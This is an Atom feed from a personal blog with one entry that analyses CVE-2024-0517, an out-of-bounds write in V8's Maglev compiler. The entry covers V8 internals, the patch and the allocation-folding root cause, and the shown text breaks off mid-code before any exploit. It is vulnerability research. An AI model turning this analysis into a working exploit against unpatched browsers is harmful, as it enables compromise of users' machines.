<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>蓝桉&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-02-16T16:54:00.963Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>蓝桉</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2024-0517</title>
    <link href="http://example.com/2025/01/18/CVE-2024-0517/"/>
    <id>http://example.com/2025/01/18/CVE-2024-0517/</id>
    <published>2025-01-18T08:17:51.000Z</published>
    <updated>2025-02-16T16:54:00.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞源于 V8 引擎的 Maglev 编译器在处理具有父类的类时的编译机制。在此场景下，编译器需遍历所有父类及其构造函数进行查找，而此过程中引入了安全漏洞，该漏洞的补丁和详细信息可以从<a href="https://issues.chromium.org/issues/41488920">chrome issues</a>中来进行查看，下面我们将对此漏洞进行详细的分析以及对<code>v8 shell</code>的提权操作</p><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次我们使用的是<a href="https://chromium.googlesource.com/v8/v8/+/44ac5a4467ca8be9eacd0b868650c9c5f8b0525d^"> e73f620c2ef1230ddaa61551706225821a87c3b9</a>]分支来进行此次的漏洞分析，下面我们来进行简单的环境搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先获取V8源码拉取工具</span></span><br><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HOME</span>/depot_tools:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$HOME/depot_tools:$PATH&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取源码</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">fetch v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git checkout e73f620c2ef1230ddaa61551706225821a87c3b9</span><br><span class="line">gclient <span class="built_in">sync</span> -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># build v8</span></span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;source ~/v8/v8/tools/gdbinit&#x27;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="V8引擎简介"><a href="#V8引擎简介" class="headerlink" title="V8引擎简介"></a>V8引擎简介</h3><p>V8引擎包含<strong>*Ignition(解释器)、Sparkplug(基线编译器)、Maglev(中层优化编译器)和TurboFan(优化编译器)<em>*<em>。</em>Ignition*作为一种寄存器式虚拟机，负责将解析后的</em>*AST</strong>转换为字节码。其优化阶段最关键的步骤之一就是识别<strong>hot code</strong>，随后将这些代码送入<strong>Maglev</strong>进行初步优化。若代码进一步被频繁执行，则会进入<strong>TurboFan</strong>进行深度优化。</p><h3 id="Maglev"><a href="#Maglev" class="headerlink" title="Maglev"></a>Maglev</h3><p><strong>Maglev</strong>是位于基线编译器之后和优化编译器之前，其优化决策完全依赖于解释器运行期间收集的反馈数据。为实现静态层面的高效优化，Maglev 通过构建由节点组成的<strong>控制流图（Control Flow Graph, CFG</strong>即 **Maglev 中间表示（Maglev IR)**来支撑其优化流程。</p><p>我们可以通过如下代码来进行对其有初步的了解</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(add);</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(add);</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>执行<code>./v8/out/x64.debug/d8 --allow-natives-syntax --print-maglev-graph ./exp/test1.js</code>首先会打印其字节码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x3473000021d8 @    0 : 0b 04             Ldar a1</span><br><span class="line">0x3473000021da @    2 : 3a 03 00          Mul a0, [0]</span><br><span class="line">0x3473000021dd @    5 : ab                Return</span><br></pre></td></tr></table></figure><p>然后就会打印其IR图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Graph</span><br><span class="line"></span><br><span class="line">    1/5: Constant(0x0ad8000c3c89 &lt;NativeContext[285]&gt;) → v-1, live range: [1-10]</span><br><span class="line">    2/4: Constant(0x0ad8000da915 &lt;JSFunction add (sfi = 0xad8000da86d)&gt;) → v-1, live range: [2-10]</span><br><span class="line"> Block b1</span><br><span class="line">0x0ad8000da86d &lt;SharedFunctionInfo add&gt; (0x0ad8001c9479 &lt;String[14]: <span class="string">&quot;./exp/test1.js&quot;</span>&gt;)</span><br><span class="line">   0 : Ldar a1</span><br><span class="line">    3/1: InitialValue(&lt;this&gt;) → [stack:-6|t], live range: [3-10]</span><br><span class="line">    4/2: InitialValue(a0) → [stack:-7|t], live range: [4-10]</span><br><span class="line">    5/3: InitialValue(a1) → [stack:-8|t], live range: [5-10]</span><br><span class="line">    6/7: FunctionEntryStackCheck</span><br><span class="line">         ↳ lazy @-1 (4 live vars)</span><br><span class="line">    7/8: Jump b2</span><br><span class="line">      ↓</span><br><span class="line"> Block b2</span><br><span class="line">     15: GapMove([stack:-7|t] → [rax|R|t])</span><br><span class="line">   2 : Mul a0, [0]</span><br><span class="line">         ↱ eager @2 (5 live vars)</span><br><span class="line">    8/9: CheckedSmiUntag [v4/n2:[rax|R|t]] → [rax|R|w32], live range: [8-10]</span><br><span class="line">     16: GapMove([stack:-8|t] → [rcx|R|t])</span><br><span class="line">         ↱ eager @2 (5 live vars)</span><br><span class="line">   9/10: CheckedSmiUntag [v5/n3:[rcx|R|t]] → [rcx|R|w32], live range: [9-10]</span><br><span class="line">         ↱ eager @2 (5 live vars)</span><br><span class="line">  10/11: Int32MultiplyWithOverflow [v8/n9:[rax|R|w32], v9/n10:[rcx|R|w32]] → [rax|R|w32], live range: [10-12]</span><br><span class="line">   5 : Return</span><br><span class="line">  11/12: ReduceInterruptBudgetForReturn(5)</span><br><span class="line">  12/13: Int32ToNumber [v10/n11:[rax|R|w32]] → [rcx|R|t], live range: [12-13]</span><br><span class="line">     17: GapMove([rcx|R|t] → [rax|R|t])</span><br><span class="line">  13/14: Return [v12/n13:[rax|R|t]]</span><br></pre></td></tr></table></figure><p>我们可以很清楚的看到<code>Block b1</code>是入口块，<code>Block b2</code>是主逻辑块，所以控制流就是<code>b1 - b2 - Return</code></p><p>关于<code>b1</code>块我们可以清楚的看到其执行的是初始化与安全检查，而<code>b2</code>块则是乘法运算逻辑</p><h3 id="Ubercage"><a href="#Ubercage" class="headerlink" title="Ubercage"></a>Ubercage</h3><p><strong>Ubercage</strong>（也称为 <strong>V8 沙盒</strong>，注意区别于 Chrome 沙盒）是 V8 引擎内部引入的一种新型防御机制，其目标是在攻击者成功利用 V8 漏洞后，仍能强制限制内存读写边界。</p><p>该机制的设计核心是将 <strong>V8 堆内存</strong>重新定位到一个预保留的虚拟地址空间（称为沙盒）。此设计假设攻击者能够破坏 V8 堆内存，但通过沙盒隔离，将内存访问限制在沙盒内部，从而阻止攻击者在成功利用 V8 漏洞后实现任意代码执行。Ubercage 本质上为 V8 创建了一个<strong>进程内沙盒</strong>，将潜在的任意内存写入转化为受边界约束的写入，且性能开销极低。</p><p>Uberage的另一种机制是<strong>代码指针沙盒化</strong>。其实现方式就是从JS对象中移除直接存储的代码指针，改为使用一个索引指向内存中独立隔离区域的代码指针表。</p><p>最后，Ubercage 还移除了 <strong>Typed Array 对象中完整的 64 位指针</strong>，此前，攻击者可利用这些对象的<strong>数据指针（backing store）</strong> 构造任意读写原语但，Ubercage 的部署使此攻击路径彻底失效。</p><h3 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h3><p>垃圾收集是一个内存的管理过程，是一种自动释放无引用对象内存的管理机制。在V8引擎中，存在新生代和老生代两个概念：当新生代的<strong>From-Speace</strong>被填满时，就会触发新生代的GC清理无用对象，而另外一侧的<strong>To-Speace</strong>则会以相同的方式工作，若对象在经历两次GC之后仍然存活，就会移入老生代空间。可以阅读这个<a href="https://deepu.tech/memory-management-in-v8/">博客</a>来对此知识有更加深入的了解。</p><h3 id="V8中的对象表示"><a href="#V8中的对象表示" class="headerlink" title="V8中的对象表示"></a>V8中的对象表示</h3><p>V8在64位构建的时候会采用指针压缩技术，所有指针在V8堆中均以32位值存储。为了区分当前的值时指针还是小整数(SMI)，V8会采用指针标记机制，即指针的末位设为1，则将该位与V8堆基值相加，解压缩为完成指针，而SMI则会将数值左移一位，末位保留0。读取时右移一位即可，下面我们来看代码具体了解一下。</p><p><img src="/2025/01/18/CVE-2024-0517/image-20250126160818169.png"></p><p>下面我们查看一下gdb中的内存视图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### array a</span></span><br><span class="line">DebugPrint: 0x18860004a8a9: [JSArray]</span><br><span class="line"> - map: 0x18860018e601 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x18860018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x188600199c99 &lt;FixedArray[1]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x1886000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x188600000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x188600025d29 &lt;AccessorInfo name= 0x188600000cf1 &lt;String[6]: #length&gt;, data= 0x188600000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x188600199c99 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 15</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">##### 查看elements</span></span><br><span class="line">0x188600199c98: 0x000005dd <span class="comment"># map     0x00000002 #length      0x0000001e # 15     0x0000105d</span></span><br><span class="line">0x188600199ca8: 0x00000000      0x00199c99      0x00000565      0x00000004</span><br><span class="line">0x188600199cb8: 0x00199ca5      0x00199c81      0x000008a1      0x00400000</span><br><span class="line">0x188600199cc8: 0x00000046      0x00199cb1      0x00000e19      0x00000061</span><br><span class="line">0x188600199cd8: 0x00000010      0x00000008      0x00000000      0x2500007a</span><br></pre></td></tr></table></figure><p>上图可以看出<code>0x1e</code>右移一位刚好与数组的15对应，下面我们来看b数组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### array b</span></span><br><span class="line">DebugPrint: 0x18860004a8b9: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x188600199d85 &lt;Map[16](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x188600184ae5 &lt;Object map = 0x188600184121&gt;</span><br><span class="line"> - elements: 0x1886000006a5 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x1886000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x188600002981: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#a: 0x188600002981 &lt;String[1]: #a&gt; (const data field 0), location: in-object</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">##### gdb</span></span><br><span class="line">x/30wx 0x18860004a8b9-1</span><br><span class="line">0x18860004a8b8: 0x00199d85 <span class="comment"># map    0x000006a5 # elements  0x000006a5  0x00002981 # Named properties</span></span><br><span class="line">0x18860004a8c8: 0x00000605      0x00010001      0x00000000      0x000006cd</span><br><span class="line">0x18860004a8d8: 0x00002981      0x00000184      0x00000002      0x00000000</span><br><span class="line">0x18860004a8e8: 0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x18860004a8f8: 0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x18860004a908: 0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x18860004a918: 0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x18860004a928: 0x00000000      0x0000000</span><br></pre></td></tr></table></figure><p><strong>V8 对象包含两种属性类型</strong>：</p><ol><li><strong>数字属性</strong>（如 <code>obj[0]</code>、<code>obj[1]</code>）：<ul><li>通常存储在一个由 <strong><code>elements</code> 指针</strong>指向的连续数组中。</li></ul></li><li><strong>命名属性</strong>（如 <code>obj[&quot;a&quot;]</code> 或 <code>obj.a</code>）：<ul><li>默认存储在对象自身的内存块内（内联属性）。</li><li>当新增属性数量超过默认阈值（通常为 <strong>4 个</strong>）时，后续属性将存储在一个由 <strong><code>properties</code> 指针</strong>指向的连续数组中。</li></ul></li></ol><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>惯例我们先从补丁开始看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-5597</span>,<span class="number">6</span> +<span class="number">5597</span>,<span class="number">7</span> @@</span><br><span class="line">           object = <span class="built_in">BuildAllocateFastObject</span>(</span><br><span class="line">               <span class="built_in">FastObject</span>(new_target_function-&gt;<span class="built_in">AsJSFunction</span>(), <span class="built_in">zone</span>(), <span class="built_in">broker</span>()),</span><br><span class="line">               AllocationType::kYoung);</span><br><span class="line">+          <span class="built_in">ClearCurrentRawAllocation</span>();</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           object = <span class="built_in">BuildCallBuiltin</span>&lt;Builtin::kFastNewObject&gt;(</span><br><span class="line">               &#123;<span class="built_in">GetConstant</span>(current_function), new_target&#125;);</span><br></pre></td></tr></table></figure><p>补丁很简单就添加了一个函数<code>ClearCurrentRawAllocation()</code>，该函数如下，其目的就是将<code>current_raw_allocation_</code>指针置为空，下面我们来分析一下这个指针的作用以及为何会触发漏洞。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MaglevGraphBuilder::ClearCurrentRawAllocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  current_raw_allocation_ = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分配折叠"><a href="#分配折叠" class="headerlink" title="分配折叠"></a>分配折叠</h3><p>Maglev试图通过将多次内存分配合并为单个大分配来优化内存分配策略。其核心机制是维护一个指向最后一次执行内存分配的节点（AllocateRaw节点）的指针。当后续出现新的内存请求时，系统会执行若干检查：若条件满足，则会直接扩展前次分配的容量，将新请求的大小累加到原有分配上。例如，若先前请求分配了12字节内存，后续又请求88字节，Maglev会将第一次分配扩展为100字节，并完全消除第二次独立分配。此时前12字节用于原始请求，后续88字节空间则服务于第二次请求。</p><p>当Maglev执行代码降级(lowering)并遇到需要内存分配的场景时，会调用MaglevGraphBuilder::ExtendOrReallocateCurrentRawAllocation()函数。该函数的源代码实现如下所示。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"></span><br><span class="line"><span class="function">ValueNode* <span class="title">MaglevGraphBuilder::ExtendOrReallocateCurrentRawAllocation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> size, AllocationType allocation_type)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (!current_raw_allocation_ ||</span><br><span class="line">      current_raw_allocation_-＞<span class="built_in">allocation_type</span>() != allocation_type ||</span><br><span class="line">      !v8_flags.inline_new) &#123;</span><br><span class="line">    current_raw_allocation_ =</span><br><span class="line">        AddNewNode＜AllocateRaw＞(&#123;&#125;, allocation_type, size);</span><br><span class="line">    <span class="keyword">return</span> current_raw_allocation_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> current_size = current_raw_allocation_-＞<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">if</span> (current_size + size ＞ kMaxRegularHeapObjectSize) &#123;</span><br><span class="line">    <span class="keyword">return</span> current_raw_allocation_ =</span><br><span class="line">               AddNewNode＜AllocateRaw＞(&#123;&#125;, allocation_type, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">DCHECK_GT</span>(current_size, <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> previous_end = current_size;</span><br><span class="line">  current_raw_allocation_-＞<span class="built_in">extend</span>(size);</span><br><span class="line">  <span class="keyword">return</span> AddNewNode＜FoldedAllocation＞(&#123;current_raw_allocation_&#125;, previous_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数的目标是 <strong>合并连续的内存分配请求</strong> 以减少内存分配次数。通过复用或扩展前一次分配，避免频繁调用内存分配器，提升性能。假设连续两次调用：</p><ol><li><code>ExtendOrReallocateCurrentRawAllocation(12, NEW_SPACE)</code><ul><li>首次无当前分配 → 创建 <code>AllocateRaw(12)</code>，<code>current_raw_allocation_</code> 指向它。</li></ul></li><li><code>ExtendOrReallocateCurrentRawAllocation(88, NEW_SPACE)</code><ul><li>类型相同且未超限 → 扩展 <code>AllocateRaw</code> 至 100 字节，返回 <code>FoldedAllocation</code> 节点指向偏移 12。</li></ul></li></ol><p>内存布局：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AllocateRaw(100)][FoldedAllocation(offset=12)]</span><br><span class="line">|----12----|----88----|</span><br></pre></td></tr></table></figure><p>Maglev通过这种方式优化内存分配次数，在代码中该技术被称为<strong>分配折叠（Allocation Folding）</strong>，而那些通过扩展前一次分配大小而被优化掉的分配则称为<strong>折叠式分配（Folded Allocations）</strong>。然而，这里存在一个与**垃圾回收（Garbage Collection, GC）**相关的隐患。如之前章节所述，V8引擎采用**移动式垃圾回收器（Moving Garbage Collector）**。因此，如果在两次“折叠式”分配之间触发了GC，会导致以下问题：</p><ol><li><strong>第一次分配的对象被移动</strong><br>GC会将第一个分配已初始化的对象移动到堆中的其他位置（例如内存整理期间）。</li><li><strong>为第二次分配保留的空间被释放</strong><br>由于GC发生在第一个对象初始化之后、第二个对象初始化之前，GC无法感知到第二个分配的存在（此时第二个对象尚未初始化）。因此，GC会认为原分配空间中为第二个对象预留的部分是“空闲内存”，并将其释放。</li><li><strong>越界写入风险</strong><br>当后续尝试初始化第二个对象时，<code>FoldedAllocation</code>节点会基于原始分配的偏移量（例如偏移12字节）计算地址。但由于第一个对象已被移动，原始分配的内存可能已被回收或重新分配，此时基于旧地址的偏移量写入数据将导致<strong>越界写入（Out-of-Bounds Write）</strong>。</li></ol><h3 id="BuildAllocateFastObject函数"><a href="#BuildAllocateFastObject函数" class="headerlink" title="BuildAllocateFastObject函数"></a>BuildAllocateFastObject函数</h3><p><code>BuildAllocateFastObject()</code> 函数是对 <code>ExtendOrReallocateCurrentRawAllocation()</code> 的<strong>封装函数</strong>，其核心功能是**通过多次调用 <code>ExtendOrReallocateCurrentRawAllocation()</code>**，代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"><span class="function">ValueNode* <span class="title">MaglevGraphBuilder::BuildAllocateFastObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    FastObject object, AllocationType allocation_type)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[TRUNCATED]</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  ValueNode* allocation = <span class="built_in">ExtendOrReallocateCurrentRawAllocation</span>(</span><br><span class="line">      object.instance_size, allocation_type);</span><br><span class="line"></span><br><span class="line">[TRUNCATED]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> allocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如 [1] 处代码所示，<code>BuildAllocateFastObject()</code> 函数在需要分配内存时会调用 <code>ExtendOrReallocateCurrentRawAllocation()</code>，随后将分配的内存初始化为对象数据。此过程中有一个<strong>关键设计细节</strong>：该函数<strong>不会在完成后主动清除 <code>current_raw_allocation_</code> 变量</strong>，而是将此责任交给调用方，由其在适当时机通过调用 <code>MaglevGraphBuilder</code> 的辅助函数 <code>ClearCurrentRawAllocation()</code> 将 <code>current_raw_allocation_</code> 置为 <code>NULL</code>。若未正确清理此变量，可能导致<strong>跨 GC 边界的错误折叠分配</strong>，进而引发越界写入漏洞。</p><h3 id="VisitFindNonDefaultConstructorOrConstruct函数"><a href="#VisitFindNonDefaultConstructorOrConstruct函数" class="headerlink" title="VisitFindNonDefaultConstructorOrConstruct函数"></a>VisitFindNonDefaultConstructorOrConstruct函数</h3><p>FindNonDefaultConstructorOrConstruct（查找非默认构造函数或构造）字节码操作码用于构建对象实例。该操作码会从构造函数的超构造函数开始沿着原型链向上遍历，直到发现一个非默认构造函数。正如我们之前在测试案例中看到的情况，如果最终遍历到默认的基构造函数（如基础场景），则会创建该对象的实例。</p><p>Maglev编译器通过调用VisitFindNonDefaultConstructorOrConstruct()函数，将这个操作码转换为Maglev中间表示（IR）。该函数代码如下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MaglevGraphBuilder::VisitFindNonDefaultConstructorOrConstruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ValueNode* this_function = <span class="built_in">LoadRegisterTagged</span>(<span class="number">0</span>);</span><br><span class="line">  ValueNode* new_target = <span class="built_in">LoadRegisterTagged</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> register_pair = iterator_.<span class="built_in">GetRegisterPairOperand</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [1]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">TryBuildFindNonDefaultConstructorOrConstruct</span>(this_function, new_target,</span><br><span class="line">                                                   register_pair)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [2]</span></span><br><span class="line"></span><br><span class="line">  CallBuiltin* result =</span><br><span class="line">      <span class="built_in">BuildCallBuiltin</span>(</span><br><span class="line">          &#123;this_function, new_target&#125;);</span><br><span class="line">  <span class="built_in">StoreRegisterPair</span>(register_pair, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现其在[1]处调用了**TryBuildFindNonDefaultConstructorOrConstruct()**函数，该函数就是我们此次漏洞所在的地方，下面我们来看一下这个函数</p><h3 id="TryBuildFindNonDefaultConstructorOrConstruct函数"><a href="#TryBuildFindNonDefaultConstructorOrConstruct函数" class="headerlink" title="TryBuildFindNonDefaultConstructorOrConstruct函数"></a>TryBuildFindNonDefaultConstructorOrConstruct函数</h3><p>这个函数代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 